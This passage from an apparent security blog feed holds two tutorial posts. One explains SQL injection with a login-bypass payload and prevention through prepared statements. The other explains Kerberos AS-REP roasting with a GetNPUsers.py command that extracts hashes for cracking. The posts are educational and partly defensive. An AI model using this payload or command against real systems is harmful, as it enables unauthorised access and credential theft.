/><published>2020-03-24T00:00:00-04:00</published><updated>2020-03-24T00:00:00-04:00</updated><id>http://localhost:4000/SQL-Injection</id><content type="html" xml:base="http://localhost:4000/SQL-Injection/">&lt;p&gt;A basic overview on SQL Injection.&lt;/p&gt;

&lt;h4 id=&quot;what-is-sql&quot;&gt;What is SQL?&lt;/h4&gt;

&lt;p&gt;SQL stands for “Structured Query Language”, which is used to communicate with a database. SQL statements are instructions for creating, retrieving, updating/altering and removing data within the database.&lt;/p&gt;

&lt;h4 id=&quot;what-is-sql-injection&quot;&gt;What is SQL Injection?&lt;/h4&gt;

&lt;p&gt;SQL Injection is a type of injection attack that consists of insertion and injection of an SQL query via user-controlled input (aka untrusted sources). Web applications generally have portions of logic that are controlled by the results of a query. When these queries rely on user-supplied input (as many do), they can be improperly escaped, filtered, or validated, which results in the application being vulnerable to SQL Injection. An attacker can manipulate said vulnerable query to alter application logic.&lt;/p&gt;

&lt;p&gt;SQL Injection can result in bypassed authentication, control of the database, disclosure of sensitive data, and in some scenarios an attacker can run commands on the vulnerable system (sometimes resulting in a reverse shell).&lt;/p&gt;

&lt;h4 id=&quot;example-of-basic-sql-injection&quot;&gt;Example of (basic) SQL Injection&lt;/h4&gt;

&lt;p&gt;Say we have a web application that uses MySQL for its database. The application requires the user to log in. We log in with the username ‘hacker’ and the password ‘goodpassword.’ The corresponding SQL query would look something like the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hacker&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;goodpassword&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The user is supplying the values for the username and password to log into the application. This query causes the database to check for records within the users table where the username value is equal to hacker and the password value is equal to goodpassword. If the database finds a record that matches those values, the login is successful. If, say, the password value is incorrect, it may return an error message saying that the username/password combination is incorrect, and ‘hacker’ is unable to log in.&lt;/p&gt;

&lt;p&gt;So, we know that if the query returns at least one result, we’re logged in (as it would have found the corresponding record). If it returns no result, we’re still not in. Let’s take a wild guess here and assume that there is an ‘admin’ user, but we don’t know the password. Can we still log in? Yes.&lt;/p&gt;

&lt;p&gt;First, we need to break out of the query at hand using a single-quote. Then, we want to supply a new SQL statement that begins with OR, which in this instance I am using || as a substitute for &lt;strong&gt;OR&lt;/strong&gt; (old habits die hard). Next, we supply the meat of our statement, setting an ALWAYS TRUE statement with &lt;strong&gt;1=1&lt;/strong&gt;. Finally, we comment out the remaining query with #. Note that -- can also be used for commenting in SQL.&lt;/p&gt;

&lt;p&gt;We submit the following into the username login panel:
admin’||1=1#&lt;/p&gt;

&lt;p&gt;And whatever in the password panel.&lt;/p&gt;

&lt;p&gt;Our new SQL query looks something like:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’’&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Everything after # is ignored (due to it being commented out with #), and we get logged in because the query retrieved at least one result by way of the statement being set to TRUE. In fact, in this example, we don’t even need a valid username, due to the OR statement. We are setting the whole statement to TRUE, and due to this I believe we get logged in as whoever possesses the first user id in the database (which generally corresponds to the admin user). *&lt;/p&gt;

&lt;p&gt;* &lt;em&gt;I’m working off my knowledge of these things and not actively hacking into a vulnerable web app so this (who we get logged in as) may be incorrect.&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;how-to-prevent-sql-injection&quot;&gt;How to prevent SQL Injection?&lt;/h4&gt;

&lt;p&gt;Prepared statements (aka parameterized queries) are the safest route in protecting against SQL injection, but they are not infallible. A prepareted statement is a means of pre-compiling an SQL statement so that all that needs to be supplied on the user’s end are the parameters in order for the statement to be executed. Think of it as a template, with the application/developers specifying the query’s structure. The server preprocesses the request without parameters so that it knows what type of query it is (contrast this with dynamic queries, which are processed at run-time and therefore can be maliciously altered to suit the attacker’s needs).&lt;/p&gt;

&lt;p&gt;Prepared statements ensure that an attacker is not able to change the intent of a query, due to the query having already been defined. How you write parameterized queries depends on what language your web application is written in and it goes beyond the scope of this wee blog post, but essentially, you construct an SQL query template with certain values (aka parameters) left unspecified, with ‘?’ used for the value placeholders of said parameters. The database parses and compiles the SQL query and stores the result without executing it. When a user is interacting with the application and does an action that invokes the precompiled query, they supply their value for the parameter(s) (e.g. username and password), and the application binds the values to the parameters and executes the statement.&lt;/p&gt;

&lt;p&gt;Let’s revisit the above example.&lt;/p&gt;

&lt;p&gt;The attacker has submitted a username with a value of &lt;strong&gt;‘Admin OR 1=1 #&lt;/strong&gt; in hopes of altering the query to bypass authentication. If a prepared statement is being used, however, instead of the SQL query being altered, the DB will search for a user with a username of &lt;strong&gt;‘Admin OR 1=1 #&lt;/strong&gt;. The attacker would be unable to escape out of the SQL statement at hand and append their own SQL to do a malicious request.&lt;/p&gt;

&lt;p&gt;OWASP has a great reference guide to get an idea of how parameterized queries are used, amongst other things:
&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html&quot;&gt;OWASP Cheatsheet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Prepared statements are not infallible, however. You must still ensure that proper escaping is used everywhere&lt;/p&gt;

&lt;p&gt;In some scenarios (depending on the type of query being performed), prepared statements are not useful. In those cases, such as an ORDER BY query, whitelisting permitted input logic is the way to go.&lt;/p&gt;

&lt;h4 id=&quot;useful-reading&quot;&gt;Useful Reading&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection&quot;&gt;Portswigger SQL Injection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Web Application Hacker’s Handbook by Dafydd Stuttard and Marcus Pinto&lt;/p&gt;</content><author><name></name></author><summary type="html">A basic overview on SQL Injection.</summary></entry><entry><title type="html">GetNPUsers.py</title><link href="http://localhost:4000/GetNPUsers/" rel="alternate" type="text/html" title="GetNPUsers.py" /><published>2020-03-15T00:00:00-04:00</published><updated>2020-03-15T00:00:00-04:00</updated><id>http://localhost:4000/GetNPUsers</id><content type="html" xml:base="http://localhost:4000/GetNPUsers/">&lt;p&gt;I’ve been trying to familiarize myself with the numerous tools found in the Impacket library, many of which exploit vulnerabilities within Windows Active Directory structures. One such tool I have used in the past but failed to really understand is “GetNPUsers.py”. This post is a quick lesson on Kerberos ticketing and how GetNPUsers.py exploits users without pre-authentication enabled.&lt;/p&gt;

&lt;p&gt;While not necessarily a common vulnerability in the wild (as pre-authentication is enabled by default), I found learning about this vulnerability a paltable approach to understanding the basics of Kerberos ticketing.&lt;/p&gt;

&lt;p&gt;First, we need to familiarize ourselves with Kerberos. Kerberos is a protocol for authentication that is the default method of authorization used by Microsoft Windows. It uses tickets to authenticate.&lt;/p&gt;

&lt;h4 id=&quot;how-does-kerberos-authenticate&quot;&gt;How does Kerberos authenticate?&lt;/h4&gt;

&lt;p&gt;The client sends a request to the KDC (Key Distribution Center). The KDC creates a TGT (ticket-granting ticket) for the client and encrypts it using the client’s password as the key, and sends the encrypted TGT back to the client. If the client decrypts the TGT (with their password), they keep the decrypted TGT as proof of their (the client’s) identity.&lt;/p&gt;

&lt;p&gt;While not the default state, there is a vulnerable option available for Kerberos users: ‘Do not require Kerberos preauthentication’ (UF_DONT_REQUIRE_PREAUTH). When pre-authentication is enabled, a time stamp is encrypted using the user’s password hash as an encryption key. If the KDC reads a valid time while using the user’s hash to decrypt the time stamp, the KDC knows that the request isn’t a replay of the previous request. &lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;If pre-authentication is disabled, an attacker can send a request for authentication. The KDC will return an encrypted TGT from which an attacker can retrieve the vulnerable user’s hash and crack it offline. The hash is in krb5asrep format. GetNPUsers.py is a script that does just that – it enumerates for users within an AD domain that have PREAUTH disabled, and retrieves a krb5asrep hash from the requested TGT.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py&quot;&gt;GetNPUSers.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The proper usage of the command would look something like the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:/impacket/examples/&amp;gt; python GetNPUsers.py testAD.local/ &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; hashcat &lt;span class=&quot;nt&quot;&gt;-outputfile&lt;/span&gt; hashes.testAD&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here, the usersfile flag is pointing to a list of guessed or known users in the target Windows domain, “testAD.local”. If a user on the list has UF_DONT_REQUIRE_PREAUTH enabled, GetNPUsers.py receives a TGT from which a hash is then extracted and dumped into the hashes.testAD file. We can then attempt to crack the hash by using hashcat (as that is the output format we have chosen).&lt;/p&gt;

&lt;h4 id=&quot;useful-reading&quot;&gt;Useful reading&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/&quot;&gt;Roasting AS-REPS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.roguelynn.com/words/explain-like-im-5-kerberos/&quot;&gt;Explain like I’m five: Kerberos&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:1&quot;&gt;
      &lt;p&gt;&lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx&quot;&gt;Kerberos Pre-Authentication: Why It Should Not Be Disabled&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;</content><author><name></name></author><summary type="html">I’ve been trying to familiarize myself with the numerous tools found in the Impacket library, many of which exploit vulnerabilities within Windows Active Directory structures. One such tool I have used in the past but failed to really understand is “GetNPUsers.py”. This post is a quick lesson on Kerberos ticketing and how GetNPUsers.py exploits users without pre-authentication enabled.</summary></entry></feed>